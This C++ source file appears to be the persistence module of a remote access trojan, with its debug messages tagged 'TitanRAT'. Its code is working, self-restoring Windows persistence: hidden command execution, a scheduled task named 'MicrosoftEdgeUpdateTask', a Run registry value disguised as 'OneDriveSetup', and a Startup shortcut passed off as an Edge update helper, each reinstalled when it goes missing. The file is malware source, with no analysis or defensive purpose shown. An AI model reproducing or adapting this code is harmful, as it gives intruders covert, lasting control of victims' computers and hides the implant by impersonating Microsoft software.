// Core/persistence.cpp — ФИНАЛЬНАЯ ВЕРСИЯ (ЗАМЕНИТЬ ЦЕЛИКОМ)
#include "persistence.h"
#include <windows.h>
#include <shellapi.h>   // For IsUserAnAdmin()
#include <shlobj.h>     // For SHGetFolderPathW, CSIDL_STARTUP
#include <shlwapi.h>    // For PathFileExistsW
#include <stdio.h>
#include <string>

// Helper: run command silently
static int run_cmd_hidden(const char* cmd) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmdBuf[2048];
    strcpy_s(cmdBuf, cmd);

    if (CreateProcessA(NULL, cmdBuf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return (int)exitCode;
    }
    return -1;
}

// Create shortcut (Unicode-safe)
static bool create_startup_shortcut(const char* exe_path) {
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return false;

    IShellLinkW* pShellLink = NULL;
    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&pShellLink);
    if (FAILED(hr)) {
        CoUninitialize();
        return false;
    }

    WCHAR wPath[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0, exe_path, -1, wPath, MAX_PATH);

    pShellLink->SetPath(wPath);
    pShellLink->SetDescription(L"Microsoft Edge Update Helper"); 

    IPersistFile* pPersistFile = NULL;
    hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
    if (SUCCEEDED(hr)) {
        WCHAR startupPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupPath))) {
            WCHAR linkPath[MAX_PATH];
            wcscpy_s(linkPath, startupPath);
            wcscat_s(linkPath, L"\\MicrosoftEdgeUpdate.lnk");
            hr = pPersistFile->Save(linkPath, TRUE);
            if (SUCCEEDED(hr)) {
                OutputDebugStringA("[TitanRAT] Startup shortcut created.\n");
            }
        }
        pPersistFile->Release();
    }
    
    pShellLink->Release();
    CoUninitialize();
    return SUCCEEDED(hr);
}

// Check shortcut
static bool check_startup_shortcut() {
    WCHAR startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupPath))) {
        WCHAR linkPath[MAX_PATH];
        wcscpy_s(linkPath, startupPath);
        wcscat_s(linkPath, L"\\MicrosoftEdgeUpdate.lnk");
        return PathFileExistsW(linkPath) == TRUE;
    }
    return false;
}

// Remove shortcut
static void remove_startup_shortcut() {
    WCHAR startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupPath))) {
        WCHAR linkPath[MAX_PATH];
        wcscpy_s(linkPath, startupPath);
        wcscat_s(linkPath, L"\\MicrosoftEdgeUpdate.lnk");
        DeleteFileW(linkPath);
        OutputDebugStringA("[TitanRAT] Startup shortcut removed.\n");
    }
}

// Check Task Scheduler
static bool task_exists() {
    return run_cmd_hidden("schtasks /query /tn \"MicrosoftEdgeUpdateTask\" >nul 2>&1") == 0;
}

// Check Registry
static bool reg_value_exists() {
    HKEY hKey;
    bool exists = false;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD type, size = MAX_PATH;
        char buffer[MAX_PATH];
        if (RegQueryValueExA(hKey, "OneDriveSetup", NULL, &type, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            exists = true;
        }
        RegCloseKey(hKey);
    }
    return exists;
}

void install_persistence(const char* exe_path) {
    if (!exe_path) return;

    // Task Scheduler requires Admin. Gate it explicitly.
    if (IsUserAnAdmin()) {
        char cmd[2048];
        bool has_space = (std::string(exe_path).find(' ') != std::string::npos);
        if (has_space)
            sprintf_s(cmd, "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" /tr \"\\\"%s\\\"\" /sc onlogon /f", exe_path);
        else
            sprintf_s(cmd, "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" /tr \"%s\" /sc onlogon /f", exe_path);

        int rc = run_cmd_hidden(cmd);
        char log[256];
        sprintf_s(log, "[TitanRAT] Schtasks exit code: %d\n", rc);
        OutputDebugStringA(log);

        if (rc == 0) {
            OutputDebugStringA("[TitanRAT] Task scheduler persistence installed.\n");
        } else {
            OutputDebugStringA("[TitanRAT] Warning: Task Scheduler creation failed.\n");
        }
    } else {
        OutputDebugStringA("[TitanRAT] Non-admin session: skipping Task Scheduler (requires elevation).\n");
    }
    
    // Registry + Startup work without Admin. Always install.
    HKEY hKey;
    LONG res = RegCreateKeyExA(HKEY_CURRENT_USER, 
                               "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                               0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (res == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "OneDriveSetup", 0, REG_SZ, (LPBYTE)exe_path, (DWORD)strlen(exe_path) + 1);
        RegCloseKey(hKey);
        OutputDebugStringA("[TitanRAT] Registry persistence installed.\n");
    }
}

void uninstall_persistence() {
    char log[256];
    
    // Task Scheduler deletion requires Admin. Gate it.
    if (IsUserAnAdmin()) {
        int rc = run_cmd_hidden("schtasks /delete /tn \"MicrosoftEdgeUpdateTask\" /f 2>&1");
        if (rc == 0) {
            OutputDebugStringA("[TitanRAT] Task Scheduler: deleted successfully.\n");
        } else {
            sprintf_s(log, "[TitanRAT] Task Scheduler: failed (code %d). Check if task exists.\n", rc);
            OutputDebugStringA(log);
        }
    } else {
        OutputDebugStringA("[TitanRAT] Non-admin session: skipping Task Scheduler cleanup.\n");
    }

    // Remove Startup shortcut
    WCHAR startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupPath))) {
        WCHAR linkPath[MAX_PATH];
        wcscpy_s(linkPath, startupPath);
        wcscat_s(linkPath, L"\\MicrosoftEdgeUpdate.lnk");
        
        if (DeleteFileW(linkPath)) {
            OutputDebugStringA("[TitanRAT] Startup shortcut removed.\n");
        }
    }
    
    // Remove Registry key
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                      0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        LONG res = RegDeleteValueA(hKey, "OneDriveSetup");
        sprintf_s(log, "[TitanRAT] Registry delete exit code: %ld\n", res);
        OutputDebugStringA(log);
        RegCloseKey(hKey);
    }
}

void check_persistence() {
    char exe_path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, exe_path, MAX_PATH)) return;

    // Check Registry
    if (!reg_value_exists()) {
        OutputDebugStringA("[TitanRAT] Registry persistence missing. Restoring...\n");
        HKEY hK;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hK) == ERROR_SUCCESS) {
             RegSetValueExA(hK, "OneDriveSetup", 0, REG_SZ, (LPBYTE)exe_path, (DWORD)strlen(exe_path)+1);
             RegCloseKey(hK);
        }
    }

    // Check Task OR Shortcut
    bool task_ok = task_exists();
    bool shortcut_ok = check_startup_shortcut();

    if (!task_ok && !shortcut_ok) {
        OutputDebugStringA("[TitanRAT] Persistence missing. Restoring...\n");
        install_persistence(exe_path);
    } else {
        OutputDebugStringA("[TitanRAT] Persistence verified.\n");
    }
}